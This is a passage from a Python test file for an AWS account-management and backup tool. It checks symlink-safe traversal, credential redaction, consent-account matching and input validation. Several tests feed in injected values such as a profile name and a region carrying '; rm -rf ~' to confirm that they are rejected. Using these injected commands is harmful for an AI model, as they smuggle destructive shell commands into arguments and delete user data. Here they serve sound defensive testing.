            mock.patch.object(backup, "is_link_or_junction", return_value=True),
            mock.patch.object(backup.storage, "get_file") as get_file,
        ):
            with pytest.raises(ValueError):
                backup.restore_download(
                    "p", "us-west-2", "b", "snapshots/a.tar.gz", account="111122223333"
                )
        get_file.assert_not_called()


class TestRound24Hardening:
    """Round-24 pins: descriptor-pinned ancestors, and redaction before trimming."""

    def test_traversal_never_resolves_a_path_by_name(self, tmp_path):
        # The ancestor-swap window exists only if a child is reached by
        # re-resolving its path. On POSIX every open must go through dir_fd, so
        # a bare os.open with a path argument is a regression: patch os.open to
        # reject any call without dir_fd and the archive must still come out
        # complete.
        import os
        import tarfile as _tarfile

        from kiro_crew.apps.builtins.aws_control.backend import backup

        if not backup._CAN_PIN_TRAVERSAL:
            pytest.skip("platform has no openat; the name-based fallback is covered above")

        root = tmp_path / "sessions"
        (root / "nested" / "deep").mkdir(parents=True)
        (root / "a.json").write_bytes(b"a")
        (root / "nested" / "b.json").write_bytes(b"bb")
        (root / "nested" / "deep" / "c.json").write_bytes(b"ccc")

        real_open = os.open
        root_path = str(root)

        def only_pinned_or_root(path, flags, *args, **kwargs):
            # The root itself is opened by path (there is no parent fd yet);
            # everything below it must be relative to a directory descriptor.
            if kwargs.get("dir_fd") is None and str(path) != root_path:
                raise AssertionError(f"resolved by name: {path}")
            return real_open(path, flags, *args, **kwargs)

        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            with mock.patch.object(os, "open", side_effect=only_pinned_or_root):
                count = backup._add_tree(tar, root, "crew")

        with _tarfile.open(archive) as tar:
            names = sorted(tar.getnames())
            assert tar.extractfile("crew/nested/deep/c.json").read() == b"ccc"  # type: ignore[union-attr]
        assert count == 3
        assert names == [
            "crew/a.json",
            "crew/nested/b.json",
            "crew/nested/deep/c.json",
        ]

    def test_pinned_traversal_refuses_a_symlinked_subdirectory(self, tmp_path):
        from kiro_crew.apps.builtins.aws_control.backend import backup as _bk

        if not _bk._CAN_PIN_TRAVERSAL:
            pytest.skip(
                "descriptor-pinned traversal is unavailable here, so the backup"
                " refuses by design -- TestRefusalWithoutPinnedTraversal covers that"
            )
        import tarfile as _tarfile

        from kiro_crew.apps.builtins.aws_control.backend import backup

        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "credentials").write_bytes(b"secret")
        root = tmp_path / "sessions"
        root.mkdir()
        (root / "real.json").write_bytes(b"{}")
        (root / "escape").symlink_to(outside, target_is_directory=True)

        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            count = backup._add_tree(tar, root, "crew")
        with _tarfile.open(archive) as tar:
            names = tar.getnames()
        assert count == 1
        assert names == ["crew/real.json"]

    def test_depth_ceiling_prunes_instead_of_exhausting_descriptors(self, tmp_path):
        import tarfile as _tarfile

        from kiro_crew.apps.builtins.aws_control.backend import backup

        # The ceiling is a property of the PINNED descent specifically: it holds
        # one descriptor per level, so a pathological tree could exhaust the
        # process's fd budget. The name-based fallback holds none and therefore
        # needs no ceiling - adding one there would silently truncate a Windows
        # backup for no safety reason.
        if not backup._CAN_PIN_TRAVERSAL:
            pytest.skip("the depth ceiling guards the pinned descent's fd budget only")
        root = tmp_path / "sessions"
        deep = root
        for i in range(backup._MAX_TREE_DEPTH + 3):
            deep = deep / f"d{i}"
        deep.mkdir(parents=True)
        (deep / "buried.json").write_bytes(b"{}")
        (root / "top.json").write_bytes(b"{}")

        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            count = backup._add_tree(tar, root, "crew")
        with _tarfile.open(archive) as tar:
            names = tar.getnames()
        # The shallow file is archived; the one past the ceiling is pruned, and
        # the call returns rather than running the process out of descriptors.
        assert "crew/top.json" in names
        assert not any("buried.json" in n for n in names)
        assert count >= 1

    def test_stderr_is_redacted_before_it_is_trimmed(self):
        # Trimming first can cut a credential in half, and a half token matches
        # no redaction pattern - so the fragment survives every later pass. The
        # secret is placed so that a naive `err[:200]` would split it.
        from kiro_crew.deploy import engine

        secret = "AKIAIOSFODNN7EXAMPLE"
        padded = "x" * 190 + secret + " trailing context"
        out = engine._trimmed_stderr(padded)

        assert len(out) <= 200
        # Neither the whole token nor a recognisable head of it may survive.
        assert secret not in out
        assert secret[:10] not in out


class TestRound26Hardening:
    """Round-26 pins: fallback member names are '/'-joined, and the recorded
    consent must name the account being uploaded to."""

    def _authorizing_env(self, grant_account: str):
        """Everything authorizes except the grant's account, which is the variable."""
        grant = SimpleNamespace(
            service="s3",
            profile="p",
            region="us-west-2",
            account=grant_account,
            arn="arn:aws:sts::x:assumed-role/y",
            granted_at="2026-01-01T00:00:00Z",
        )
        return (
            mock.patch(
                "kiro_crew.deploy.engine._checked",
                return_value=json.dumps({"Account": ACCOUNT}),
            ),
            mock.patch("kiro_crew.apps.manager.is_app_enabled", return_value=True),
            mock.patch("kiro_crew.aws_consent.is_granted", return_value=(True, "")),
            mock.patch("kiro_crew.aws_consent.read_grant", return_value=grant),
        )

    def test_grant_for_another_account_refuses_the_upload(self):
        # The chain this closes: a backup for account A starts, the same profile
        # is repointed and consent is recorded for account B, then the profile
        # points back at A. `is_granted` matches profile+region and says yes, and
        # the live probe says A -- but the consent on file belongs to B, so the
        # owner never approved S3 use for A. Refuse.
        from kiro_crew.apps.builtins.aws_control.backend import backup

        p1, p2, p3, p4 = self._authorizing_env("999988887777")
        with p1, p2, p3, p4:
            backup.clear_stop()
            with pytest.raises(RuntimeError, match="does not name this account"):
                backup._authorize_upload(ACCOUNT, "p", "us-west-2", caller=backup.CALLER_OWNER)

    def test_grant_naming_no_account_refuses_the_upload(self):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        p1, p2, p3, p4 = self._authorizing_env("")
        with p1, p2, p3, p4:
            backup.clear_stop()
            with pytest.raises(RuntimeError, match="does not name this account"):
                backup._authorize_upload(ACCOUNT, "p", "us-west-2", caller=backup.CALLER_OWNER)

    def test_matching_grant_account_allows_the_upload(self):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        p1, p2, p3, p4 = self._authorizing_env(ACCOUNT)
        with p1, p2, p3, p4:
            backup.clear_stop()
            backup._authorize_upload(
                ACCOUNT, "p", "us-west-2", caller=backup.CALLER_OWNER
            )  # no raise

    def test_grant_withdrawn_mid_build_refuses_the_upload(self):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        with (
            mock.patch(
                "kiro_crew.deploy.engine._checked",
                return_value=json.dumps({"Account": ACCOUNT}),
            ),
            mock.patch("kiro_crew.apps.manager.is_app_enabled", return_value=True),
            mock.patch("kiro_crew.aws_consent.is_granted", return_value=(True, "")),
            mock.patch("kiro_crew.aws_consent.read_grant", return_value=None),
        ):
            backup.clear_stop()
            with pytest.raises(RuntimeError, match="withdrawn"):
                backup._authorize_upload(ACCOUNT, "p", "us-west-2", caller=backup.CALLER_OWNER)


class TestProfileDiscovery:
    """The answer to 'why can I not see my accounts': the portal now lists the
    local profiles it has NOT registered, and can register them."""

    def _env(self):
        return (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(routes_mod, "is_owner_dashboard_request", return_value=True),
        )

    def _post(self, body):
        """A register request carrying ``body`` -- the file's own body-stub shape."""
        req = _request("POST", "/profiles/register")
        req.json = AsyncMock(return_value=body)  # type: ignore[method-assign]
        return req

    def test_available_marks_which_local_profiles_are_registered(self):
        handlers = _registered()
        p1, p2 = self._env()
        with (
            p1,
            p2,
            mock.patch.object(
                routes_mod.deploy_profiles,
                "discover_aws_profiles",
                return_value=["alpha", "beta", "gamma"],
            ),
            mock.patch.object(
                routes_mod.deploy_profiles,
                "load_registry",
                return_value={"version": 2, "profiles": [{"name": "beta"}], "default": "beta"},
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/profiles/available")](  # type: ignore[operator]
                    _request("GET", "/profiles/available")
                )
            )
        body = _payload(resp)
        assert resp.status == 200
        assert {r["name"]: r["registered"] for r in body["profiles"]} == {
            "alpha": False,
            "beta": True,
            "gamma": False,
        }
        assert body["registeredCount"] == 1
        assert body["max"] == routes_mod._MAX_REGISTERED

    def test_available_drops_a_name_that_fails_the_shared_pattern(self):
        # The listing is a display surface, so a hostile name must not reach it
        # even though the CLI reported it.
        handlers = _registered()
        p1, p2 = self._env()
        with (
            p1,
            p2,
            mock.patch.object(
                routes_mod.deploy_profiles,
                "discover_aws_profiles",
                return_value=["ok-name", "bad name; rm -rf ~"],
            ),
            mock.patch.object(
                routes_mod.deploy_profiles,
                "load_registry",
                return_value={"version": 2, "profiles": [], "default": ""},
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/profiles/available")](  # type: ignore[operator]
                    _request("GET", "/profiles/available")
                )
            )
        names = [r["name"] for r in _payload(resp)["profiles"]]
        assert names == ["ok-name"]

    def test_register_refuses_a_name_the_machine_does_not_have(self):
        # The registry is agent-writable and its names reach an argv, so the
        # endpoint may only register something `list-profiles` actually reported.
        handlers = _registered()
        p1, p2 = self._env()
        with (
            p1,
            p2,
            mock.patch.object(
                routes_mod.deploy_profiles, "discover_aws_profiles", return_value=["real"]
            ),
            mock.patch.object(routes_mod.deploy_profiles, "locked_registry") as locked,
        ):
            resp = asyncio.run(
                handlers[("POST", "/profiles/register")](  # type: ignore[operator]
                    self._post({"names": ["planted"]})
                )
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "unknown_profile"
        locked.assert_not_called()

    def test_register_rejects_an_empty_or_non_list_body(self):
        handlers = _registered()
        p1, p2 = self._env()
        for bad in ({}, {"names": []}, {"names": "alpha"}):
            with p1, p2:
                resp = asyncio.run(
                    handlers[("POST", "/profiles/register")](  # type: ignore[operator]
                        self._post(bad)
                    )
                )
            assert resp.status == 400
            assert _payload(resp)["code"] == "invalid_names"

    def test_register_adds_new_skips_existing_and_invalidates_the_snapshot(self):
        handlers = _registered()
        reg = {"version": 2, "profiles": [{"name": "beta"}], "default": "beta"}

        @contextlib.contextmanager
        def _fake_locked():
            yield reg

        p1, p2 = self._env()
        with (
            p1,
            p2,
            mock.patch.object(
                routes_mod.deploy_profiles,
                "discover_aws_profiles",
                return_value=["alpha", "beta"],
            ),
            mock.patch.object(routes_mod.deploy_profiles, "locked_registry", _fake_locked),
            mock.patch.object(routes_mod.accounts_mod, "invalidate_cache") as invalidated,
        ):
            resp = asyncio.run(
                handlers[("POST", "/profiles/register")](  # type: ignore[operator]
                    self._post({"names": ["alpha", "beta"]})
                )
            )
        assert _payload(resp) == {"added": 1, "skipped": 1}
        assert [p["name"] for p in reg["profiles"]] == ["beta", "alpha"]
        # Registration records NO account id: the account is whatever a live
        # probe resolves, and a guessed one would seed a stale mapping.
        assert reg["profiles"][1]["account"] == ""
        # The snapshot is TTL-cached, so the page would otherwise keep showing
        # the pre-registration set for minutes.
        invalidated.assert_called_once()

    def test_register_stops_at_the_registry_cap(self):
        handlers = _registered()
        full = [{"name": f"p{i}"} for i in range(routes_mod._MAX_REGISTERED)]
        reg = {"version": 2, "profiles": full, "default": "p0"}

        @contextlib.contextmanager
        def _fake_locked():
            yield reg

        p1, p2 = self._env()
        with (
            p1,
            p2,
            mock.patch.object(
                routes_mod.deploy_profiles, "discover_aws_profiles", return_value=["extra"]
            ),
            mock.patch.object(routes_mod.deploy_profiles, "locked_registry", _fake_locked),
            mock.patch.object(routes_mod.accounts_mod, "invalidate_cache"),
        ):
            resp = asyncio.run(
                handlers[("POST", "/profiles/register")](  # type: ignore[operator]
                    self._post({"names": ["extra"]})
                )
            )
        assert _payload(resp) == {"added": 0, "skipped": 1}
        assert len(reg["profiles"]) == routes_mod._MAX_REGISTERED


class TestBootstrapReauthorizes:
    """Round-28 pin: the billable create re-checks authorization INSIDE the lock.

    What sits between the pre-lock checks and `create_drive` is an unbounded lock
    wait plus a tag-discovery round trip to AWS -- a real suspension point. A
    profile repointed in that window would otherwise have a bucket made and
    billed in an account the owner never confirmed.
    """

    def _confirm_request(self):
        req = _request(
            "POST",
            f"/drive/{ACCOUNT}/bootstrap",
            match_info={"account": ACCOUNT},
        )
        req.json = AsyncMock(return_value={"confirm": True})  # type: ignore[method-assign]
        return req

    def test_a_connection_that_changes_mid_create_refuses_and_creates_nothing(self):
        handlers = _registered()
        # First resolution (pre-lock) is the requested account; the second, taken
        # inside the lock right before the billable call, resolves a DIFFERENT
        # profile -- the repointed-in-the-window case.
        targets = [
            (ACCOUNT, "prof-a", "us-west-2"),
            (ACCOUNT, "prof-b", "us-west-2"),
        ]

        async def _target(_request_obj):
            return targets.pop(0)

        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(routes_mod, "is_owner_dashboard_request", return_value=True),
            mock.patch.object(routes_mod, "_account_target", side_effect=_target),
            mock.patch.object(routes_mod, "_consent", AsyncMock(return_value=None)),
            mock.patch.object(routes_mod, "_drive_bucket", AsyncMock(return_value="")),
            mock.patch.object(routes_mod.storage_mod, "create_drive") as create,
        ):
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](  # type: ignore[operator]
                    self._confirm_request()
                )
            )
        assert resp.status == 409
        assert _payload(resp)["code"] == "account_mismatch"
        create.assert_not_called()

    def test_consent_withdrawn_mid_create_refuses_and_creates_nothing(self):
        handlers = _registered()
        target = (ACCOUNT, "prof-a", "us-west-2")
        # Granted before the lock, withdrawn by the time the in-lock re-read runs.
        consent_results = [None, routes_mod._forbidden("consent gone", "aws_consent_required")]

        async def _consent(*_a, **_k):
            return consent_results.pop(0)

        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(routes_mod, "is_owner_dashboard_request", return_value=True),
            mock.patch.object(routes_mod, "_account_target", AsyncMock(return_value=target)),
            mock.patch.object(routes_mod, "_consent", side_effect=_consent),
            mock.patch.object(routes_mod, "_drive_bucket", AsyncMock(return_value="")),
            mock.patch.object(routes_mod.storage_mod, "create_drive") as create,
        ):
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](  # type: ignore[operator]
                    self._confirm_request()
                )
            )
        assert resp.status == 403
        assert _payload(resp)["code"] == "aws_consent_required"
        create.assert_not_called()

    def test_a_stable_connection_still_creates(self):
        handlers = _registered()
        target = (ACCOUNT, "prof-a", "us-west-2")
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(routes_mod, "is_owner_dashboard_request", return_value=True),
            mock.patch.object(routes_mod, "_account_target", AsyncMock(return_value=target)),
            mock.patch.object(routes_mod, "_consent", AsyncMock(return_value=None)),
            mock.patch.object(routes_mod, "_drive_bucket", AsyncMock(return_value="")),
            mock.patch.object(
                routes_mod.storage_mod, "create_drive", return_value="kirocrew-drive-abc123def456"
            ) as create,
        ):
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](  # type: ignore[operator]
                    self._confirm_request()
                )
            )
        assert _payload(resp) == {"created": True, "bucket": "kirocrew-drive-abc123def456"}
        create.assert_called_once()


class TestRound29Hardening:
    """Round-29 pins: the bill is scoped to ONE account, and registration keeps
    the region the profile itself declares."""

    def test_cost_query_filters_to_the_selected_account(self, tmp_path, monkeypatch):
        # A management (payer) profile returns the whole organization's spend
        # unless the query says otherwise, and this app would cache that as one
        # account's bill. The filter is what makes the figure mean what the page
        # claims. Asserting on the argv is the only way to pin it.
        from kiro_crew.apps.builtins.aws_control.backend import costs

        monkeypatch.setattr(costs, "_cache_path", lambda account: tmp_path / "c.json")
        payload = json.dumps({"ResultsByTime": []})
        with mock.patch.object(costs, "_checked", return_value=payload) as checked:
            costs.fetch_month_costs("p", "us-west-2", ACCOUNT)
        argv = checked.call_args.args[0]
        assert "--filter" in argv
        spec = json.loads(argv[argv.index("--filter") + 1])
        assert spec == {"Dimensions": {"Key": "LINKED_ACCOUNT", "Values": [ACCOUNT]}}

    def test_registration_records_the_profiles_own_region(self):
        handlers = _registered()
        reg = {"version": 2, "profiles": [], "default": ""}

        @contextlib.contextmanager
        def _fake_locked():
            yield reg

        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(routes_mod, "is_owner_dashboard_request", return_value=True),
            mock.patch.object(
                routes_mod.deploy_profiles, "discover_aws_profiles", return_value=["eu-prof"]
            ),
            mock.patch.object(
                routes_mod.accounts_mod,
                "configured_region",
                AsyncMock(return_value="eu-central-1"),
            ),
            mock.patch.object(routes_mod.deploy_profiles, "locked_registry", _fake_locked),
            mock.patch.object(routes_mod.accounts_mod, "invalidate_cache"),
        ):
            req = _request("POST", "/profiles/register")
            req.json = AsyncMock(return_value={"names": ["eu-prof"]})  # type: ignore[method-assign]
            resp = asyncio.run(handlers[("POST", "/profiles/register")](req))  # type: ignore[operator]
        assert _payload(resp) == {"added": 1, "skipped": 0}
        # Not DEFAULT_REGION: registering a profile configured elsewhere with an
        # empty region would create its drive bucket in the wrong region.
        assert reg["profiles"][0]["region"] == "eu-central-1"
        # The account is still left for a live probe to resolve.
        assert reg["profiles"][0]["account"] == ""

    def test_a_profile_declaring_no_region_still_registers(self):
        handlers = _registered()
        reg = {"version": 2, "profiles": [], "default": ""}

        @contextlib.contextmanager
        def _fake_locked():
            yield reg

        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(routes_mod, "is_owner_dashboard_request", return_value=True),
            mock.patch.object(
                routes_mod.deploy_profiles, "discover_aws_profiles", return_value=["bare"]
            ),
            mock.patch.object(
                routes_mod.accounts_mod, "configured_region", AsyncMock(return_value="")
            ),
            mock.patch.object(routes_mod.deploy_profiles, "locked_registry", _fake_locked),
            mock.patch.object(routes_mod.accounts_mod, "invalidate_cache"),
        ):
            req = _request("POST", "/profiles/register")
            req.json = AsyncMock(return_value={"names": ["bare"]})  # type: ignore[method-assign]
            resp = asyncio.run(handlers[("POST", "/profiles/register")](req))  # type: ignore[operator]
        assert _payload(resp) == {"added": 1, "skipped": 0}
        # make_entry's own default applies only when the profile declares nothing.
        assert reg["profiles"][0]["region"] == routes_mod.deploy_profiles.DEFAULT_REGION

    def test_configured_region_refuses_a_value_that_is_not_a_region(self):
        # ~/.aws/config is operator-writable text and this value flows into an
        # argv, so a non-region string must read as "declares none" rather than
        # being trusted.
        from kiro_crew.apps.builtins.aws_control.backend import accounts

        for bad in ("not a region", "us-west-2; rm -rf ~", ""):
            with mock.patch.object(accounts.engine, "run_aws", return_value=(0, bad, "")):
                assert asyncio.run(accounts.configured_region("p")) == ""
        with mock.patch.object(
            accounts.engine, "run_aws", return_value=(0, "ap-southeast-2\n", "")
        ):
            assert asyncio.run(accounts.configured_region("p")) == "ap-southeast-2"


class TestRound36Hardening:
    """A dead nightly loop, and a credential-shaped profile name on a display card."""

    def test_a_timezone_less_last_run_reads_as_due_instead_of_crashing(self):
        # The nastier half of this class: a timezone-LESS ISO stamp parses fine,
        # so it escapes the try/except entirely and used to raise TypeError on the
        # aware subtraction that sits OUTSIDE the guard -- in the nightly loop,
        # every wake, so a backup the owner enabled silently never ran.
        from kiro_crew.apps.builtins.aws_control.backend import backup

        with (
            mock.patch.object(backup, "nightly_enabled", return_value=True),
            mock.patch.object(
                backup,
                "last_runs",
                return_value={backup.KIND_SNAPSHOT: {"at": "2026-01-01T00:00:00"}},
            ),
        ):
            # Naive stamp far in the past: due, and no exception.
            assert backup.due_for_nightly(ACCOUNT) is True

    def test_a_recent_timezone_less_last_run_is_not_due(self):
        # The normalization must not make every naive stamp "due" -- it is read as
        # UTC, the same treatment costs.is_fresh and shares._prune already apply.
        import datetime as _dt

        from kiro_crew.apps.builtins.aws_control.backend import backup

        recent = _dt.datetime.now(_dt.timezone.utc).replace(tzinfo=None).isoformat()
        with (
            mock.patch.object(backup, "nightly_enabled", return_value=True),
            mock.patch.object(
                backup, "last_runs", return_value={backup.KIND_SNAPSHOT: {"at": recent}}
            ),
        ):
            assert backup.due_for_nightly(ACCOUNT) is False

    def test_a_non_string_last_run_reads_as_due(self):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        for bad in (5, ["2026-01-01"], None, {}):
            with (
                mock.patch.object(backup, "nightly_enabled", return_value=True),
                mock.patch.object(
                    backup, "last_runs", return_value={backup.KIND_SNAPSHOT: {"at": bad}}
                ),
            ):
                assert backup.due_for_nightly(ACCOUNT) is True

    def test_a_credential_shaped_profile_name_is_redacted_in_the_reconnect_command(self):
        # _PROFILE_RE is a shell-safety gate, not a secret gate: it admits
        # [A-Za-z0-9._@=+-] up to 128 chars, so an access key id passes it and
        # would render verbatim into the guidance card and the clipboard.
        from kiro_crew.apps.builtins.aws_control.backend import accounts

        key = "AKIAIOSFODNN7EXAMPLE"
        plan = accounts.reconnect_plan(accounts.KIND_SSO, key)
        assert key not in plan["command"]
        # Still a usable command shape, not an empty string.
        assert plan["command"].startswith("aws sso login --profile ")

    def test_an_ordinary_profile_name_survives_the_reconnect_command(self):
        from kiro_crew.apps.builtins.aws_control.backend import accounts

        plan = accounts.reconnect_plan(accounts.KIND_SSO, "team-prod")
        assert plan["command"] == "aws sso login --profile team-prod"
